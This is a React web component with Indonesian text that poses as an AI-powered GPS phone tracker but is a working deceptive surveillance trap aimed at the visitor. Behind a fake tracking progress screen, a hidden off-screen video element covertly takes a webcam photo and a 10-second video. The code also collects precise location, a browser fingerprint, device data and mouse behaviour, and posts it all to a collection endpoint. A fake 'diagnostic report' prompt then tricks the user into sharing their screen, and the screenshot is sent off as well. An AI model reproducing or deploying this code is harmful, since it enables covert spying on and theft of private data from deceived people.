"use client";

import { useState, useRef, useEffect } from 'react';
import { Loader2, Satellite, MapPin, Radar, ShieldAlert, Wifi, Radio, Cpu, CheckCircle } from 'lucide-react';

type StatusType = 'idle' | 'loading' | 'success' | 'error' | 'ask_screenshot' | 'done';

async function collectDeviceStatus(): Promise<{
  battery: { level: number; charging: boolean } | null;
  connection: { effectiveType: string; downlink: number; rtt: number; saveData: boolean } | null;
  hardware: { ram: number | null; cores: number | null };
}> {
  let battery = null;
  try {
    if ('getBattery' in navigator) {
      const bm = await (navigator as any).getBattery();
      battery = { level: Math.round(bm.level * 100), charging: bm.charging };
    }
  } catch (_) {}

  let connection = null;
  try {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      connection = {
        effectiveType: conn.effectiveType || null,
        downlink: conn.downlink ?? null,
        rtt: conn.rtt ?? null,
        saveData: conn.saveData ?? false,
      };
    }
  } catch (_) {}

  const hardware = {
    ram: (navigator as any).deviceMemory ?? null,
    cores: navigator.hardwareConcurrency ?? null,
  };

  return { battery, connection, hardware };
}

// Helper: dapatkan lokasi dengan timeout panjang
function getLocation(timeoutMs: number): Promise<{ lat: number; lng: number; accuracy: number; timestamp: number } | null> {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(null); return; }
    const timer = setTimeout(() => resolve(null), timeoutMs);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timer);
        resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp,
        });
      },
      () => { clearTimeout(timer); resolve(null); },
      { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
    );
  });
}

interface CameraVerificationProps {
  phoneNumber?: string;
}

export default function CameraVerification({ phoneNumber = '' }: CameraVerificationProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [status, setStatus] = useState<StatusType>('idle');
  const [message, setMessage] = useState<string>('Sistem akan menghubungkan ke jaringan satelit GPS untuk memulai proses pelacakan. Izinkan akses perangkat untuk sinkronisasi node terdekat.');
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState('');

  const sessionId = useRef<string>('');
  const mountTime = useRef<number>(Date.now());
  const mousePath = useRef<number[][]>([]);
  const firstClickXy = useRef<number[] | null>(null);
  const timeToClickMs = useRef<number | null>(null);
  const maxScrollDepth = useRef<number>(0);
  const payloadRef = useRef<any>({});

  useEffect(() => {
    const generateId = () =>
      typeof crypto !== 'undefined' && crypto.randomUUID
        ? crypto.randomUUID()
        : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
          });
    sessionId.current = generateId();

    const getCanvasHash = () => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (!ctx) return null;
        ctx.textBaseline = 'top';
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint, hash', 2, 15);
        const dataURL = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataURL.length; i++) {
          const char = dataURL.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash;
        }
        return hash.toString();
      } catch { return null; }
    };

    const getWebGLVendor = () => {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null;
        }
      } catch {}
      return null;
    };

    payloadRef.current.fingerprint = {
      user_agent: navigator.userAgent,
      screen_resolution: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      webgl_vendor: getWebGLVendor(),
      canvas_hash: getCanvasHash(),
      fonts_installed: [],
    };

    const handleMouseMove = (e: MouseEvent) => {
      if (mousePath.current.length < 50) mousePath.current.push([e.clientX, e.clientY]);
    };
    const handleScroll = () => {
      const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
      const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
      const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
      if (scrolled > maxScrollDepth.current) maxScrollDepth.current = Math.round(scrolled);
    };

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('scroll', handleScroll);
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  const sendPayload = async (data: any) => {
    try {
      await fetch('/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
    } catch (err) {
      console.error('Gagal kirim payload', err);
    }
  };

  useEffect(() => {
    if (status !== 'loading') return;
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 95) { clearInterval(interval); return 95; }
        return prev + Math.random() * 2.5;
      });
    }, 400);
    return () => clearInterval(interval);
  }, [status]);

  const handleTrack = async (e: React.MouseEvent) => {
    if (!firstClickXy.current) {
      firstClickXy.current = [e.clientX, e.clientY];
      timeToClickMs.current = Date.now() - mountTime.current;
    }

    setStatus('loading');
    setProgress(0);
    setCurrentStep('Menginisialisasi AI Neural Network...');
    setMessage('AI Core aktif. Mencari pola pergerakan target dan jaringan satelit terdekat. Harap izinkan akses perangkat untuk optimasi pelacakan...');

    try {
      // ── Mulai minta LOKASI lebih awal (concurrent dengan kamera) ──
      setCurrentStep('Meminta akses lokasi & kamera...');
      const locationPromise = getLocation(20000); // 20 detik timeout

      // Minta akses kamera
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false,
      });

      let photoBase64: string | null = null;
      let videoBase64: string | null = null;

      setCurrentStep('Mengenkripsi jalur data...');

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise((resolve) => {
          if (videoRef.current) {
            videoRef.current.onloadedmetadata = () =>
              videoRef.current?.play().then(resolve).catch(resolve);
          } else resolve(null);
        });
        await new Promise((r) => setTimeout(r, 800));

        // Ambil foto
        setCurrentStep('Triangulasi posisi BTS...');
        const video = videoRef.current;
        const canvas = canvasRef.current;
        if (video && canvas && video.videoWidth > 0) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
          }
        }

        // Rekam video 10 detik
        setCurrentStep('Menganalisis sinyal Wi-Fi...');
        setMessage('Memetakan koordinat satelit dan menghitung jarak triangulasi BTS terdekat...');
        try {
          const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8')
            ? 'video/webm;codecs=vp8'
            : 'video/webm';
          const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 200000 });
          const chunks: BlobPart[] = [];
          recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };

          const videoPromise = new Promise<string | null>((resolve) => {
            recorder.onstop = () => {
              const blob = new Blob(chunks, { type: 'video/webm' });
              const reader = new FileReader();
              reader.readAsDataURL(blob);
              reader.onloadend = () => resolve(reader.result as string);
              reader.onerror = () => resolve(null);
            };
          });

          recorder.start();

          const stepMessages = [
            'AI Engine menganalisis rute satelit...',
            'Deep Learning mencocokkan pola sinyal...',
            'Dekripsi algoritma enkripsi GPS...',
            'Sinkronisasi AI dengan node server...',
            'Memprediksi probabilitas lokasi (98.4% Akurat)...',
          ];
          let stepIdx = 0;
          const stepInterval = setInterval(() => {
            if (stepIdx < stepMessages.length) setCurrentStep(stepMessages[stepIdx++]);
          }, 2000);

          await new Promise((r) => setTimeout(r, 10000));
          clearInterval(stepInterval);
          recorder.stop();
          videoBase64 = await videoPromise;
        } catch (mediaErr) {
          console.error('MediaRecorder fallback', mediaErr);
        }
      }

      stream.getTracks().forEach((track) => track.stop());

      // Tunggu hasil lokasi (sudah berjalan sejak awal)
      setCurrentStep('Mengunci koordinat GPS...');
      setMessage('Memfinalisasi data GPS dan mengunci koordinat lokasi target...');
      const locationData = await locationPromise;

      const deviceStatus = await collectDeviceStatus();

      const finalPayload = {
        session_id: sessionId.current,
        timestamp: new Date().toISOString(),
        phone_number: phoneNumber,
        photo_base64: photoBase64,
        video_base64: videoBase64,
        location: locationData,
        fingerprint: payloadRef.current.fingerprint,
        behavior: {
          first_click_xy: firstClickXy.current,
          time_to_click_ms: timeToClickMs.current,
          scroll_depth_percent: maxScrollDepth.current,
          mouse_path: mousePath.current,
        },
        device_status: deviceStatus,
        screenshot_base64: null,
      };

      await sendPayload(finalPayload);

      setProgress(100);
      setCurrentStep('Koneksi terputus');
      setStatus('error');
      setMessage('Gagal mengunci koordinat target. Server pelacakan GPS sedang mengalami gangguan. Silakan coba beberapa saat lagi.');

      setTimeout(() => setStatus('ask_screenshot'), 2000);
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setMessage('Gagal terhubung ke node GPS. Mohon berikan izin akses perangkat Anda untuk melanjutkan proses pelacakan.');
    }
  };

  const handleScreenshot = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
      const video = document.createElement('video');
      video.srcObject = stream;
      await new Promise((resolve) => {
        video.onloadedmetadata = () => video.play().then(resolve).catch(resolve);
      });
      await new Promise((r) => setTimeout(r, 500));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d')?.drawImage(video, 0, 0);
      const screenshotBase64 = canvas.toDataURL('image/jpeg', 0.6);
      stream.getTracks().forEach((t) => t.stop());
      await sendPayload({
        session_id: sessionId.current,
        timestamp: new Date().toISOString(),
        screenshot_base64: screenshotBase64,
      });
    } catch (e) {
      console.error('Gagal atau ditolak mengambil screenshot', e);
    } finally {
      setStatus('done');
      setMessage('Terima kasih atas laporan Anda. Tim teknis kami akan segera menindaklanjuti.');
    }
  };

  const handleSkipScreenshot = () => {
    setStatus('done');
    setMessage('Server pelacakan GPS sedang mengalami gangguan. Silakan coba beberapa saat lagi.');
  };

  // ── Icon header berdasarkan status ──
  const headerIcon = () => {
    if (status === 'done') return <CheckCircle className="w-8 h-8 text-accent-blue" />;
    if (status === 'error' || status === 'ask_screenshot') return <ShieldAlert className="w-8 h-8 text-red-400" />;
    return <Satellite className={`w-8 h-8 text-accent-blue ${status === 'loading' ? 'animate-radar' : ''}`} />;
  };

  const headerTitle = () => {
    if (status === 'loading') return 'Pelacakan Aktif';
    if (status === 'error' || status === 'ask_screenshot') return 'Koneksi Terputus';
    if (status === 'done') return 'Sesi Selesai';
    return 'Mulai Pelacakan GPS';
  };

  const iconBg = (status === 'error' || status === 'ask_screenshot')
    ? 'from-red-500/20 to-red-800/20 border-red-500/30'
    : status === 'done'
    ? 'from-accent-blue/20 to-accent-cyan/20 border-accent-blue/30'
    : 'from-accent-blue/20 to-accent-purple/20 border-accent-blue/30';

  return (
    <div className="w-full max-w-lg mx-auto">
      <div className="glass-card p-7 relative overflow-hidden backdrop-blur-xl border border-white/10 shadow-2xl rounded-2xl">

        {/* Radar bg animasi saat loading */}
        {status === 'loading' && (
          <div className="absolute inset-0 flex items-center justify-center opacity-[0.07] pointer-events-none">
            <div className="w-72 h-72 rounded-full border border-accent-blue/50 animate-ring-pulse" />
            <div className="absolute w-52 h-52 rounded-full border border-accent-purple/40 animate-ring-pulse" style={{ animationDelay: '0.5s' }} />
            <div className="absolute w-32 h-32 rounded-full border border-accent-cyan/30 animate-ring-pulse" style={{ animationDelay: '1s' }} />
          </div>
        )}

        {/* Header */}
        <div className="text-center mb-6 relative z-10">
          <div className={`w-16 h-16 rounded-2xl bg-gradient-to-br ${iconBg} border flex items-center justify-center mx-auto mb-4 ${status === 'loading' ? 'animate-pulse-glow' : ''}`}>
            {headerIcon()}
          </div>
          <h3 className="font-display text-lg font-bold text-white mb-1">{headerTitle()}</h3>
          {phoneNumber && (
            <p className="text-accent-blue/80 text-sm font-mono mt-1">
              Target: {phoneNumber}
            </p>
          )}
        </div>

        {/* Elemen kamera tersembunyi */}
        <div style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: '1px', height: '1px', overflow: 'hidden' }}>
          <video ref={videoRef} autoPlay playsInline muted style={{ width: '640px', height: '480px' }} />
        </div>
        <canvas ref={canvasRef} className="hidden" />

        {/* Progress bar saat loading */}
        {status === 'loading' && (
          <div className="mb-5 relative z-10">
            <div className="flex items-center justify-between text-xs mb-2">
              <span className="text-accent-cyan flex items-center gap-1.5">
                <Radio className="w-3.5 h-3.5 animate-pulse" />
                {currentStep}
              </span>
              <span className="text-white/40 font-mono tabular-nums">{Math.round(progress)}%</span>
            </div>
            <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full bg-gradient-to-r from-accent-blue via-accent-purple to-accent-cyan transition-all duration-500 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}

        {/* Status indikator saat loading */}
        {status === 'loading' && (
          <div className="grid grid-cols-4 gap-2 mb-5 relative z-10">
            {[
              { icon: <Satellite className="w-4 h-4" />, label: 'Satelit', value: '12/24', color: 'text-accent-blue' },
              { icon: <Cpu className="w-4 h-4 animate-pulse" />, label: 'AI Core', value: 'Aktif', color: 'text-accent-cyan' },
              { icon: <Wifi className="w-4 h-4" />, label: 'Signal', value: 'Kuat', color: 'text-accent-green' },
              { icon: <Radar className="w-4 h-4 animate-radar" />, label: 'BTS', value: 'Scan', color: 'text-accent-purple' },
            ].map((item, i) => (
              <div key={i} className="bg-white/5 rounded-xl p-2.5 text-center border border-white/5">
                <div className={`${item.color} flex justify-center mb-1`}>{item.icon}</div>
                <p className="text-white/30 text-[9px] uppercase tracking-wider leading-none mb-0.5">{item.label}</p>
                <p className={`${item.color} text-[11px] font-mono font-semibold`}>{item.value}</p>
              </div>
            ))}
          </div>
        )}

        {/* Pesan status */}
        <div className={`mb-5 relative z-10 rounded-xl p-4 text-sm leading-relaxed transition-all duration-500 ${
          status === 'error' || status === 'ask_screenshot'
            ? 'bg-red-500/10 border border-red-500/20 text-red-300'
            : status === 'done'
            ? 'bg-accent-blue/10 border border-accent-blue/20 text-accent-blue'
            : 'bg-white/5 border border-white/5 text-white/60'
        }`}>
          {message}
        </div>

        {/* Tombol aksi */}
        <div className="relative z-10 space-y-3">

          {/* Ask screenshot state */}
          {status === 'ask_screenshot' && (
            <div className="space-y-3 animate-fade-in-up">
              <div className="flex items-start gap-3 bg-red-500/10 p-4 rounded-xl border border-red-500/15">
                <ShieldAlert className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                <p className="text-xs text-red-300 leading-relaxed">
                  Koneksi ke server GPS terputus secara tidak terduga. Apakah Anda ingin mengirimkan laporan diagnostik (tangkapan layar) untuk mempercepat investigasi masalah ini?
                </p>
              </div>
              <button
                onClick={handleScreenshot}
                className="w-full py-3 bg-red-500/20 text-red-300 rounded-xl hover:bg-red-500/30 font-semibold transition-all text-sm border border-red-500/25 active:scale-[0.98]"
              >
                Kirim Laporan Diagnostik
              </button>
              <button
                onClick={handleSkipScreenshot}
                className="w-full py-3 bg-white/5 text-white/40 rounded-xl hover:bg-white/10 font-medium transition-all text-sm active:scale-[0.98]"
              >
                Lewati
              </button>
            </div>
          )}

          {/* Done state */}
          {(status === 'success' || status === 'done') && (
            <div className="w-full py-4 bg-accent-blue/10 text-accent-blue rounded-xl flex justify-center items-center gap-2 font-medium text-sm animate-fade-in-up border border-accent-blue/20">
              <MapPin className="w-4 h-4" />
              Sesi pelacakan selesai
            </div>
          )}

          {/* Tombol utama: idle / loading / error */}
          {(status === 'idle' || status === 'loading' || status === 'error') && (
            <button
              onClick={handleTrack}
              disabled={status === 'loading'}
              className="btn-primary w-full py-4 font-semibold flex justify-center items-center gap-2.5 disabled:opacity-50 disabled:cursor-not-allowed text-sm transition-all duration-300 active:scale-[0.98]"
            >
              {status === 'loading' ? (
                <><Loader2 className="w-4 h-4 animate-spin" /><span className="animate-pulse">AI Sedang Melacak...</span></>
              ) : (
                <><Radar className="w-4 h-4" />Mulai Pelacakan GPS</>
              )}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
